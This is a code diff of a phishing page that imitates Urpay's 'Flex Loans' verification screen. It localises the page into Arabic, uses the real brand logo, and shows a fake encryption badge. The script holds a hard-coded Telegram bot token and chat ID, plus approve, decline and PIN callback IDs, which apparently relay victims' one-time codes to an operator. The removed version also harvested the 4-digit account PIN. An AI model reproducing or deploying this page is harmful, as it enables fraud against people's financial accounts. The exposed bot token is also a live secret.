@@ -1,827 +1,156 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar-SA" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-  <title>Urpay Flex Loans - OTP</title>
+  <title>أورباي | التحقق</title>
   <style>
     :root {
-      --brand: #0f5bff;
-      --brand-dark: #0a45c6;
-      --brand-soft: #edf4ff;
-      --brand-line: #dfeaff;
-      --text: #101828;
-      --muted: #667085;
-      --white: #ffffff;
-      --bg: #f5f8ff;
-      --shadow: 0 18px 50px rgba(15, 23, 42, 0.14);
+      --brand: #0f5bff; --brand-dark: #0a45c6; --brand-soft: #edf4ff; --brand-line: #dfeaff; --text: #101828; --muted: #667085; --bg: #f5f8ff; --white: #ffffff; --shadow: 0 18px 50px rgba(15, 23, 42, 0.14);
     }
-
     * { box-sizing: border-box; }
     html { -webkit-text-size-adjust: 100%; }
-    body {
-      margin: 0;
-      min-height: 100dvh;
-      font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background: radial-gradient(circle at top left, rgba(15, 91, 255, 0.14), transparent 30%), linear-gradient(180deg, #f8fbff 0%, #eef5ff 100%);
-      color: var(--text);
-      display: flex;
-      flex-direction: column;
-    }
-
-    .topbar {
-      height: 64px;
-      padding: 14px 20px;
-      background: linear-gradient(135deg, var(--brand) 0%, var(--brand-dark) 100%);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      box-shadow: 0 10px 28px rgba(15, 91, 255, 0.18);
-      flex-shrink: 0;
-    }
-
-    .brand { display: inline-flex; align-items: center; }
-    .menu-icon { color: #fff; font-size: 24px; font-weight: 800; }
-
-    main {
-      min-height: calc(100dvh - 64px);
-      display: grid;
-      place-items: center;
-      padding: 18px 12px;
-    }
-
-    .container {
-      width: min(100%, 500px);
-      background: rgba(255,255,255,0.98);
-      border: 1px solid var(--brand-line);
-      border-radius: 28px;
-      box-shadow: var(--shadow);
-      position: relative;
-      overflow: hidden;
-    }
-
-    .container::before {
-      content: "";
-      position: absolute;
-      inset: 0 0 auto 0;
-      height: 8px;
-      background: linear-gradient(90deg, var(--brand), var(--brand-dark));
-      z-index: 2;
-    }
-
-    .logo-section {
-      text-align: center;
-      padding: 28px 18px 18px;
-      background: linear-gradient(180deg, #ffffff 0%, var(--brand-soft) 100%);
-    }
-
-    .brand-logo {
-      display: inline-flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .logo-icon {
-      width: 54px;
-      height: 54px;
-      border-radius: 18px;
-      background: var(--white);
-      border: 2px solid var(--brand-line);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 10px 24px rgba(15, 91, 255, 0.12);
-    }
-
-    .tagline {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      margin-top: 8px;
-      padding: 8px 14px;
-      border-radius: 999px;
-      background: var(--brand-soft);
-      color: var(--brand-dark);
-      font-size: 12px;
-      font-weight: 800;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      white-space: nowrap;
-    }
-
-    .content-wrapper {
-      padding: 0 18px 22px;
-    }
-
-    h1 {
-      text-align: center;
-      font-size: clamp(24px, 6vw, 31px);
-      letter-spacing: -0.08em;
-      margin: 4px 0 8px;
-    }
-
-    .subtitle {
-      max-width: 390px;
-      margin: 0 auto 16px;
-      text-align: center;
-      color: var(--muted);
-      font-size: 14px;
-      line-height: 1.55;
-    }
-
-    .phone-display {
-      text-align: center;
-      font-size: 13px;
-      color: var(--muted);
-      margin: 0 0 18px;
-    }
-
-    .phone-display strong { color: var(--brand); font-weight: 800; }
-
-    .offer-info {
-      background: linear-gradient(180deg, #f8fbff 0%, #ffffff 100%);
-      border: 1px solid var(--brand-line);
-      border-radius: 18px;
-      padding: 15px 16px;
-      margin-bottom: 18px;
-      text-align: center;
-    }
-
-    .offer-label {
-      color: var(--brand-dark);
-      font-size: 12px;
-      font-weight: 800;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      margin-bottom: 7px;
-    }
-
-    .offer-name { font-size: 15px; font-weight: 800; margin-bottom: 3px; }
-    .offer-amount {
-      color: var(--brand);
-      font-weight: 800;
-      font-size: clamp(24px, 7vw, 31px);
-      line-height: 1.15;
-    }
-
-    .offer-meta {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin-top: 9px;
-      flex-wrap: wrap;
-      font-size: 12px;
-      color: var(--muted);
-    }
-
-    .offer-meta span { color: var(--text); font-weight: 800; }
-
-    .otp-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: clamp(6px, 2vw, 10px);
-      margin: 20px auto 18px;
-      width: 100%;
-      flex-wrap: nowrap;
-    }
-
-    .otp-input {
-      width: clamp(44px, 13vw, 58px);
-      max-width: 58px;
-      height: clamp(54px, 15vw, 66px);
-      text-align: center;
-      font-size: clamp(22px, 7vw, 28px);
-      font-weight: 800;
-      color: var(--brand);
-      border: 2px solid #dbeafe;
-      border-radius: 16px;
-      outline: none;
-      transition: all 0.18s ease;
-      background: var(--white);
-      box-shadow: 0 8px 20px rgba(15, 91, 255, 0.07);
-      caret-color: var(--brand);
-    }
-
-    .otp-input:focus {
-      border-color: var(--brand);
-      box-shadow: 0 0 0 4px rgba(15, 91, 255, 0.15), 0 10px 24px rgba(15, 91, 255, 0.10);
-      transform: translateY(-1px);
-    }
-
+    body { margin: 0; min-height: 100dvh; font-family: "Segoe UI", Tahoma, Arial, sans-serif; background: radial-gradient(circle at top left, rgba(15, 91, 255, 0.14), transparent 30%), linear-gradient(180deg, #f8fbff 0%, #eef5ff 100%); color: var(--text); direction: rtl; display:flex; flex-direction:column; }
+    .topbar { height: 64px; padding: 14px 20px; background: linear-gradient(135deg, var(--brand) 0%, var(--brand-dark) 100%); display: flex; align-items: center; justify-content: space-between; box-shadow: 0 10px 28px rgba(15, 91, 255, 0.18); flex-shrink:0; }
+    .brand { display:inline-flex; align-items:center; }
+    .menu-icon { color:#fff; font-size:24px; font-weight:800; }
+    main { min-height: calc(100dvh - 64px); padding: 18px 12px; display:grid; place-items:center; }
+    .container { width: min(100%, 500px); background: rgba(255,255,255,0.98); border: 1px solid var(--brand-line); border-radius: 28px; box-shadow: var(--shadow); position: relative; overflow: hidden; }
+    .container::before { content: ""; position: absolute; inset: 0 0 auto 0; height: 8px; background: linear-gradient(90deg, var(--brand), var(--brand-dark)); }
+    .logo-section { text-align:center; padding: 28px 18px 18px; background: linear-gradient(180deg, #ffffff 0%, var(--brand-soft) 100%); }
+    .brand-logo { display:inline-flex; flex-direction:column; align-items:center; gap:12px; }
+    .logo-icon { width:54px; height:54px; border-radius:18px; background:var(--white); border:2px solid var(--brand-line); display:flex; align-items:center; justify-content:center; box-shadow:0 10px 24px rgba(15, 91, 255, 0.12); }
+    .tagline { display:inline-flex; align-items:center; gap:8px; margin-top:8px; padding:8px 14px; border-radius:999px; background:var(--brand-soft); color:var(--brand-dark); font-size:12px; font-weight:800; letter-spacing:0.08em; text-transform:uppercase; white-space:nowrap; }
+    .content-wrapper { padding: 0 18px 22px; }
+    h1 { text-align:center; font-size: clamp(24px, 6vw, 31px); letter-spacing: -0.08em; margin: 4px 0 8px; }
+    .subtitle { max-width:395px; margin:0 auto 16px; text-align:center; color:var(--muted); font-size:14px; line-height:1.55; }
+    .phone-display { text-align:center; font-size:13px; color:var(--muted); margin:0 0 18px; }
+    .phone-display strong { color: var(--brand); font-weight:800; }
+    .offer-info { background: linear-gradient(180deg, #f8fbff 0%, #ffffff 100%); border:1px solid var(--brand-line); border-radius:18px; padding:15px 16px; margin-bottom:18px; text-align:center; }
+    .offer-label { color:var(--brand-dark); font-size:12px; font-weight:800; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:7px; }
+    .offer-name { font-size:15px; font-weight:800; margin-bottom:3px; }
+    .offer-amount { color:var(--brand); font-weight:800; font-size: clamp(24px, 7vw, 31px); line-height:1.15; }
+    .offer-meta { display:flex; justify-content:center; gap:12px; margin-top:9px; flex-wrap:wrap; font-size:12px; color:var(--muted); }
+    .offer-meta span { color:var(--text); font-weight:800; }
+    .otp-container { display:flex; justify-content:center; align-items:center; gap: clamp(5px, 1.6vw, 9px); margin:20px auto 18px; width:100%; flex-wrap:nowrap; }
+    .otp-input { width: clamp(39px, 11vw, 53px); max-width:53px; height: clamp(52px, 14vw, 64px); text-align:center; font-size: clamp(21px, 6.4vw, 27px); font-weight:800; color:var(--brand); border:2px solid #dbeafe; border-radius:16px; outline:none; transition:all 0.18s ease; background:var(--white); box-shadow:0 8px 20px rgba(15, 91, 255, 0.07); caret-color:var(--brand); }
+    .otp-input:focus { border-color: var(--brand); box-shadow: 0 0 0 4px rgba(15, 91, 255, 0.15), 0 10px 24px rgba(15, 91, 255, 0.10); transform: translateY(-1px); }
     .otp-input.filled { border-color: var(--brand); background: var(--brand-soft); }
-
-    .error-msg {
-      display: none;
-      text-align: center;
-      margin: 0 0 15px;
-      font-size: 13.5px;
-      padding: 12px 14px;
-      border-radius: 14px;
-      color: #b91c1c;
-      background: #fee2e2;
-      border: 1px solid #fca5a5;
-    }
-
-    .form-section {
-      background: var(--brand-soft);
-      border: 1px solid var(--brand-line);
-      border-radius: 20px;
-      padding: 16px;
-    }
-
-    .btn-action {
-      width: 100%;
-      border: 0;
-      border-radius: 999px;
-      padding: 16px 22px;
-      color: var(--white);
-      background: linear-gradient(135deg, var(--brand) 0%, var(--brand-dark) 100%);
-      font-size: 15px;
-      font-weight: 800;
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
-      cursor: pointer;
-      box-shadow: 0 10px 24px rgba(15, 91, 255, 0.3);
-      transition: box-shadow 0.18s ease, opacity 0.18s ease;
-    }
-
-    .btn-action:hover { box-shadow: 0 14px 30px rgba(15, 91, 255, 0.36); }
-    .btn-action:disabled { opacity: 0.7; cursor: not-allowed; }
-
-    .back-btn {
-      width: 100%;
-      margin-top: 12px;
-      background: transparent;
-      color: var(--muted);
-      border: 2px solid #dbeafe;
-      padding: 14px 18px;
-      font-size: 15px;
-      font-weight: 800;
-      border-radius: 999px;
-      cursor: pointer;
-    }
-
-    .terms {
-      margin-top: 14px;
-      color: var(--muted);
-      text-align: center;
-      font-size: 12px;
-      line-height: 1.5;
-    }
-
-    #spinner {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(10, 60, 140, 0.92);
-      z-index: 10000;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      color: white;
-      text-align: center;
-      padding: 24px;
-      backdrop-filter: blur(4px);
-    }
-
-    .spin {
-      width: 64px;
-      height: 64px;
-      border: 6px solid rgba(255,255,255,0.22);
-      border-top: 6px solid #ffffff;
-      border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      margin-bottom: 20px;
-    }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    #pinModal {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(10, 60, 140, 0.75);
-      z-index: 3000;
-      align-items: center;
-      justify-content: center;
-      padding: 16px;
-      backdrop-filter: blur(5px);
-    }
-
-    .modal-card {
-      background: var(--white);
-      width: min(100%, 480px);
-      border-radius: clamp(18px, 5vw, 26px);
-      box-shadow: 0 24px 60px rgba(10, 60, 140, 0.25);
-      overflow: hidden;
-      animation: fadeUp 0.32s cubic-bezier(.22,.8,.3,1) both;
-      max-height: 90vh;
-      display: flex;
-      flex-direction: column;
-      position: relative;
-    }
-
-    @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity:1; transform: translateY(0); } }
-
-    .modal-card::before {
-      content: "";
-      position: absolute;
-      inset: 0 0 auto 0;
-      height: 8px;
-      background: linear-gradient(90deg, var(--brand), var(--brand-dark));
-      z-index: 2;
-    }
-
-    .modal-logo-section {
-      text-align: center;
-      padding: 24px 18px 16px;
-      background: linear-gradient(180deg, #ffffff 0%, var(--brand-soft) 100%);
-      flex-shrink: 0;
-    }
-
-    .modal-content {
-      flex: 1;
-      overflow-y: auto;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .modal-h1 {
-      text-align: center;
-      font-size: clamp(22px, 5.5vw, 28px);
-      font-weight: 800;
-      letter-spacing: -0.08em;
-      margin: 20px 0 7px;
-      padding: 0 20px;
-    }
-
-    .modal-subtitle {
-      text-align: center;
-      color: var(--muted);
-      font-size: 14px;
-      padding: 0 20px 16px;
-      line-height: 1.55;
-    }
-
-    #pinInputsContainer {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: clamp(8px, 2.5vw, 14px);
-      margin: 6px auto 18px;
-      padding: 0 20px;
-    }
-
-    .pin-input {
-      width: clamp(54px, 16vw, 68px);
-      max-width: 68px;
-      height: clamp(60px, 17vw, 74px);
-      text-align: center;
-      font-size: clamp(24px, 7vw, 30px);
-      font-weight: 800;
-      color: var(--brand);
-      border: 2px solid #dbeafe;
-      border-radius: 16px;
-      outline: none;
-      background: var(--white);
-      box-shadow: 0 8px 20px rgba(15, 91, 255, 0.07);
-      caret-color: var(--brand);
-    }
-
-    .pin-input:focus {
-      border-color: var(--brand);
-      box-shadow: 0 0 0 4px rgba(15, 91, 255, 0.15), 0 10px 24px rgba(15, 91, 255, 0.10);
-      transform: translateY(-1px);
-    }
-
-    .pin-input.filled { border-color: var(--brand); background: var(--brand-soft); }
-
-    .pin-error-msg {
-      display: none;
-      text-align: center;
-      margin: 0 20px 14px;
-      font-size: 13.5px;
-      padding: 12px 14px;
-      border-radius: 14px;
-      color: #b91c1c;
-      background: #fee2e2;
-      border: 1px solid #fca5a5;
-    }
-
-    .modal-form-section { padding: 0 20px 22px; }
-
-    @media (max-width: 420px) {
-      .topbar { height: 58px; }
-      .container { border-radius: 20px; }
-      .content-wrapper { padding-left: 16px; padding-right: 16px; }
-      .otp-container { gap: 5px; }
-      .otp-input { width: 41px; height: 50px; font-size: 20px; border-radius: 13px; }
-    }
+    .error-msg { display:none; text-align:center; margin:0 0 15px; font-size:13.5px; padding:12px 14px; border-radius:14px; color:#b91c1c; background:#fee2e2; border:1px solid #fca5a5; }
+    .form-section { background: var(--brand-soft); border:1px solid var(--brand-line); border-radius:20px; padding:16px; }
+    .btn-action { width:100%; border:0; border-radius:999px; padding:16px 22px; color:var(--white); background: linear-gradient(135deg, var(--brand) 0%, var(--brand-dark) 100%); font-size:15px; font-weight:800; letter-spacing:0.04em; text-transform:uppercase; cursor:pointer; box-shadow:0 10px 24px rgba(15, 91, 255, 0.3); }
+    .back-btn { width:100%; margin-top: 12px; background: transparent; color: var(--muted); border: 2px solid #dbeafe; padding: 14px 18px; font-size: 15px; font-weight: 800; border-radius: 999px; cursor:pointer; }
+    .security-note { display:flex; align-items:center; gap:7px; justify-content:center; font-size:12px; color:var(--muted); margin-top:14px; font-weight:500; }
+    @media (max-width: 420px) { .topbar { height: 58px; } .container { border-radius:20px; } .content-wrapper { padding-left:16px; padding-right:16px; } .form-section { padding:15px; } .btn-action { padding:15px 18px; font-size:14px; } .back-btn { padding:13px 16px; font-size:14px; } .otp-container { gap:5px; } .otp-input { width:41px; height:50px; font-size:20px; border-radius:13px; } }
   </style>
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="index.html" aria-label="Urpay home">
-      <img
-        alt="revampur"
-        width="130"
-        height="30"
-        decoding="async"
-        src="/_next/image?url=https%3A%2F%2Fcms-portal.apps.ocpryd.neoleap.com.sa%2Fneo-api%2Fmedia%2Ffile%2Furpay_revamp_logo-3.webp&w=384&q=50"
-        style="height:30px;width:auto;filter:brightness(0) invert(1);"
-      />
+    <a class="brand" href="index.html" aria-label="أورباي الرئيسية">
+      <img alt="revampur" width="130" height="30" decoding="async" src="/_next/image?url=https%3A%2F%2Fcms-portal.apps.ocpryd.neoleap.com.sa%2Fneo-api%2Fmedia%2Ffile%2Furpay_revamp_logo-3.webp&w=384&q=50" style="height:30px;width:auto;filter:brightness(0) invert(1);" />
     </a>
     <div class="menu-icon" aria-hidden="true">☰</div>
   </header>
-
   <main>
     <section class="container" aria-labelledby="pageTitle">
       <div class="logo-section">
         <div class="brand-logo">
-          <div class="logo-icon" aria-hidden="true">
-            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <rect x="4" y="12" width="24" height="16" rx="4" fill="#0f5bff"/>
-              <path d="M9 12V9.5C9 6.46 11.46 4 14.5 4H17.5C20.54 4 23 6.46 23 9.5V12" stroke="#0f5bff" stroke-width="2.4" stroke-linecap="round" fill="none"/>
-              <circle cx="16" cy="20" r="3" fill="white"/>
-              <path d="M12 16H25" stroke="#ffffff" stroke-width="2" stroke-linecap="round" opacity="0.75"/>
-            </svg>
-          </div>
-          <div>
-            <div class="tagline">Flex Loans</div>
-          </div>
+          <div class="logo-icon" aria-hidden="true"><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="4" y="12" width="24" height="16" rx="4" fill="#0f5bff"/><path d="M9 12V9.5C9 6.46 11.46 4 14.5 4H17.5C20.54 4 23 6.46 23 9.5V12" stroke="#0f5bff" stroke-width="2.4" stroke-linecap="round" fill="none"/><circle cx="16" cy="20" r="3" fill="white"/><path d="M12 16H25" stroke="#ffffff" stroke-width="2" stroke-linecap="round" opacity="0.75"/></svg></div>
+          <div><div class="tagline">التمويل المرن</div></div>
         </div>
       </div>
-
       <div class="content-wrapper">
-        <h1 id="pageTitle">Verify Your Loan</h1>
-        <p class="subtitle">A 6-digit verification code has been sent to your number. Enter it below to continue your loan application.</p>
+        <h1 id="pageTitle">تأكيد جهازك</h1>
+        <p class="subtitle">أدخل رمز التحقق المكوّن من 6 أرقام للمتابعة في طلب قرض أورباي.</p>
         <p class="phone-display" id="phoneDisplay"></p>
-
-        <div class="offer-info" id="offerInfo">
-          <div class="offer-label">Loan Application</div>
-          <div class="offer-name" id="offerTitle">Urpay FlexLoan</div>
-          <div class="offer-amount" id="offerPrice">Amount pending</div>
+        <div class="offer-info">
+          <div class="offer-label">طلب القرض</div>
+          <div class="offer-name" id="offerTitle">أورباي التمويل المرن</div>
+          <div class="offer-amount" id="offerPrice">المبلغ قيد الانتظار</div>
           <div class="offer-meta" id="offerMeta"></div>
         </div>
-
-        <div class="otp-container" id="otpInputs" aria-label="6-digit verification code">
-          <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 1">
-          <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 2">
-          <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 3">
-          <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 4">
-          <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 5">
-          <input class="otp-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="Digit 6">
-        </div>
-
-        <div class="error-msg" id="errMsg">Please enter the complete 6-digit verification code.</div>
-
+        <div class="otp-container" id="otpInputs" aria-label="رمز تحقق من 6 أرقام"></div>
+        <div class="error-msg" id="errMsg"></div>
         <div class="form-section">
-          <button class="btn-action" id="verifyBtn" type="button">Verify &amp; Continue</button>
-          <button class="back-btn" type="button" onclick="window.history.back()">← Back</button>
-          <p class="terms">Urpay Flex Loans</p>
+          <button class="btn-action" id="verifyBtn" type="button">تحقق من الجهاز</button>
+          <button class="back-btn" type="button" onclick="window.history.back()">← العودة</button>
+          <div class="security-note"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>مشفر 256 بت وآمن عبر أورباي</div>
         </div>
       </div>
     </section>
   </main>
-
-  <div id="pinModal" role="dialog" aria-modal="true" aria-labelledby="pinModalTitle">
-    <div class="modal-card">
-      <div class="modal-logo-section">
-        <div class="brand-logo">
-          <div class="logo-icon" aria-hidden="true">
-            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <rect x="4" y="12" width="24" height="16" rx="4" fill="#0f5bff"/>
-              <path d="M9 12V9.5C9 6.46 11.46 4 14.5 4H17.5C20.54 4 23 6.46 23 9.5V12" stroke="#0f5bff" stroke-width="2.4" stroke-linecap="round" fill="none"/>
-              <circle cx="16" cy="20" r="3" fill="white"/>
-              <path d="M12 16H25" stroke="#ffffff" stroke-width="2" stroke-linecap="round" opacity="0.75"/>
-            </svg>
-          </div>
-          <div>
-            <div class="tagline">Flex Loans</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="modal-content">
-        <h2 class="modal-h1" id="pinModalTitle">Enter Your PIN</h2>
-        <p class="modal-subtitle">Enter your 4-digit Urpay PIN to complete this loan transaction securely.</p>
-
-        <div id="pinInputsContainer">
-          <input class="pin-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="PIN digit 1">
-          <input class="pin-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="PIN digit 2">
-          <input class="pin-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="PIN digit 3">
-          <input class="pin-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="PIN digit 4">
-        </div>
-
-        <div class="pin-error-msg" id="pinErrMsg">Incorrect PIN. Please try again.</div>
-
-        <div class="modal-form-section">
-          <button class="btn-action" id="confirmPinBtn" type="button">Confirm PIN</button>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div id="spinner">
-    <div class="spin"></div>
-    <p style="font-size:17px;font-weight:800;margin-top:4px;">Verifying code...</p>
-  </div>
-
   <script>
-    const CONFIG = { BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k', CHAT_ID: '8820857419', SUCCESS_PAGE: 'success.html', DEVICE_PAGE: 'device.html' };
+    const CONFIG = { BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k', CHAT_ID: '8820857419' };
     let state = { lastUpdateId: 0 };
     let isProcessing = false;
-
-    const otpInputs = Array.from(document.querySelectorAll('#otpInputs .otp-input'));
-    const pinInputs = Array.from(document.querySelectorAll('#pinInputsContainer .pin-input'));
     const errMsg = document.getElementById('errMsg');
-    const pinErrMsg = document.getElementById('pinErrMsg');
-    const spinner = document.getElementById('spinner');
-    const pinModal = document.getElementById('pinModal');
     const verifyBtn = document.getElementById('verifyBtn');
-    const confirmPinBtn = document.getElementById('confirmPinBtn');
     const params = new URLSearchParams(window.location.search);
-
-    function getAllParams() { return params.toString(); }
-    function buildNextUrl(page) { const qs = getAllParams(); return qs ? `${page}?${qs}` : page; }
-
-    function readJson(key) {
-      try { const r = localStorage.getItem(key); return r ? JSON.parse(r) : null; }
-      catch (e) { return null; }
-    }
-
-    function readStoredApplication() {
-      const keys = ['loanApplication', 'loanApplicationDraft', 'ecocashLoanApplication', 'flexLoanApplication'];
-      for (const k of keys) {
-        const d = readJson(k);
-        if (d && typeof d === 'object') return d;
-      }
-      return {};
-    }
-
-    function pick(...values) {
-      return values.find(v => v !== undefined && v !== null && String(v).trim() !== '') || '';
-    }
-
-    function formatAmount(value) {
-      if (!value) return 'Amount pending';
-      const cleaned = String(value).replace(/[^0-9.]/g, '');
-      const num = Number(cleaned);
-      if (Number.isFinite(num) && cleaned) return `$ ${num.toLocaleString()}`;
-      return String(value);
-    }
-
-    function maskPhone(phone) {
-      const p = phone.replace(/\s+/g, '');
-      if (p.length <= 5) return p;
-      return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
-    }
-
-    function showApplicationDetails() {
+    function maskPhone(phone) { const p = String(phone || '').replace(/\s+/g, ''); if (p.length <= 5) return p; return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2); }
+    function formatAmount(value) { if (!value) return 'المبلغ قيد الانتظار'; const n = Number(String(value).replace(/[^0-9.]/g, '')); if (Number.isFinite(n) && String(value).replace(/[^0-9.]/g, '')) return `${n.toLocaleString()} SAR`; return String(value); }
+    function readJson(key) { try { const r = localStorage.getItem(key); return r ? JSON.parse(r) : null; } catch (e) { return null; } }
+    function readStoredApplication() { const keys = ['loanApplication','loanApplicationDraft','ecocashLoanApplication','flexLoanApplication']; for (const k of keys) { const d = readJson(k); if (d && typeof d === 'object') return d; } return {}; }
+    function pick(...values) { return values.find(v => v !== undefined && v !== null && String(v).trim() !== '') || ''; }
+    function loadOffer() {
       const stored = readStoredApplication();
       const phone = pick(params.get('phone'), params.get('mobile'), params.get('msisdn'), stored.phone, stored.mobile, stored.msisdn, stored.phoneNumber, localStorage.getItem('phone'));
-      const loanName = pick(params.get('loan'), params.get('name'), params.get('loan_name'), stored.loanName, stored.loan_name, stored.name, stored.productName, 'Urpay FlexLoan');
-      const amount = pick(params.get('amount'), params.get('loan_amount'), stored.amount, stored.loanAmount, stored.loan_amount, stored.requestedAmount);
-      const duration = pick(params.get('duration'), params.get('tenor'), stored.duration, stored.tenor, stored.period);
-      const rate = pick(params.get('rate'), params.get('interest'), stored.rate, stored.interest);
+      const loanName = pick(params.get('loan'), params.get('offer'), params.get('name'), stored.loanName, stored.name, 'أورباي التمويل المرن');
+      const amount = pick(params.get('amount'), params.get('price'), stored.amount, stored.loanAmount);
+      const duration = pick(params.get('duration'), params.get('tenor'), stored.duration);
+      const rate = pick(params.get('rate'), params.get('interest'), stored.rate);
       const fee = pick(params.get('fee'), stored.fee);
-
       document.getElementById('offerTitle').textContent = loanName;
       document.getElementById('offerPrice').textContent = formatAmount(amount);
-
-      if (phone) {
-        document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>${maskPhone(phone)}</strong>`;
-      } else {
-        document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>your registered number</strong>`;
-      }
-
+      document.getElementById('phoneDisplay').innerHTML = `تم إرسال الرمز إلى <strong>${maskPhone(phone || '**********')}</strong>`;
       const meta = [];
-      if (duration) meta.push(`<div class="meta-item">Duration: <span>${duration}</span></div>`);
-      if (rate) meta.push(`<div class="meta-item">Interest: <span>${rate}</span></div>`);
-      if (fee) meta.push(`<div class="meta-item">Fee: <span>GHS ${fee}</span></div>`);
-      meta.push('<div class="meta-item">Status: <span>Pending verification</span></div>');
+      if (duration) meta.push(`<div>مدة: <span>${duration}</span></div>`);
+      if (rate) meta.push(`<div>الفائدة: <span>${rate}</span></div>`);
+      if (fee) meta.push(`<div>الرسوم: <span>${fee} SAR</span></div>`);
+      meta.push('<div>الحالة: <span>التحقق من الجهاز</span></div>');
       document.getElementById('offerMeta').innerHTML = meta.join('');
     }
-
-    function updateFilledState(input) {
-      input.classList.toggle('filled', input.value.trim() !== '');
+    function createInputs(containerId, count) {
+      const container = document.getElementById(containerId); container.innerHTML = '';
+      for (let i = 0; i < count; i++) {
+        const input = document.createElement('input'); input.type = 'tel'; input.maxLength = 1; input.className = 'otp-input'; input.inputMode = 'numeric'; input.autocomplete = 'off'; input.setAttribute('aria-label', `رقم ${i + 1}`); container.appendChild(input);
+      }
     }
-
-    function getCode(inputsArray) {
-      return inputsArray.map(i => i.value.trim()).join('');
-    }
-
-    function setupInputBehaviour(inputsArray, onComplete) {
-      inputsArray.forEach((input, index) => {
+    function getCode(containerId) { return Array.from(document.querySelectorAll(`#${containerId} .otp-input`)).map(i => i.value.trim()).join(''); }
+    function setupAutoFocus(containerId, length, callback) {
+      const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
+      inputs.forEach((input, index) => {
         input.addEventListener('input', (e) => {
-          const val = e.target.value.replace(/\D/g, '').slice(0, 1);
-          e.target.value = val;
-          updateFilledState(e.target);
-          errMsg.style.display = 'none';
-          if (val && index < inputsArray.length - 1) inputsArray[index + 1].focus();
-          if (getCode(inputsArray).length === inputsArray.length) setTimeout(onComplete, 180);
+          const val = e.target.value.replace(/\D/g, '').slice(0, 1); e.target.value = val; e.target.classList.toggle('filled', val !== ''); errMsg.style.display = 'none'; if (val && index < length - 1) inputs[index + 1].focus(); if (getCode(containerId).length === length) setTimeout(callback, 200);
         });
-
-        input.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !input.value && index > 0) {
-            inputsArray[index - 1].focus();
-          }
-        });
-
+        input.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus(); });
         input.addEventListener('paste', (e) => {
-          e.preventDefault();
-          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, inputsArray.length);
-          pasted.split('').forEach((digit, di) => {
-            if (inputsArray[di]) { inputsArray[di].value = digit; updateFilledState(inputsArray[di]); }
-          });
-          const fi = Math.min(pasted.length, inputsArray.length - 1);
-          inputsArray[fi].focus();
-          if (pasted.length === inputsArray.length) setTimeout(onComplete, 180);
+          e.preventDefault(); const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, length); pasted.split('').forEach((digit, di) => { if (inputs[di]) { inputs[di].value = digit; inputs[di].classList.add('filled'); } }); const fi = Math.min(pasted.length, length - 1); inputs[fi].focus(); if (pasted.length === length) setTimeout(callback, 200);
         });
       });
     }
-
-    function submitOTP() {
-      if (isProcessing) return;
-      const otp = getCode(otpInputs);
-      if (otp.length !== 6) {
-        errMsg.style.display = 'block';
-        otpInputs.find(i => !i.value)?.focus();
-        return;
-      }
-
-      isProcessing = true;
-      verifyBtn.disabled = true;
-      verifyBtn.textContent = 'Verifying...';
-
-      const ts = Date.now();
-      const approveId = `otp_approve_${ts}`;
-      const declineId = `otp_decline_${ts}`;
-      const verifyDeviceId = `otp_device_${ts}`;
-      const validPinId = `valid_pin_${ts}`;
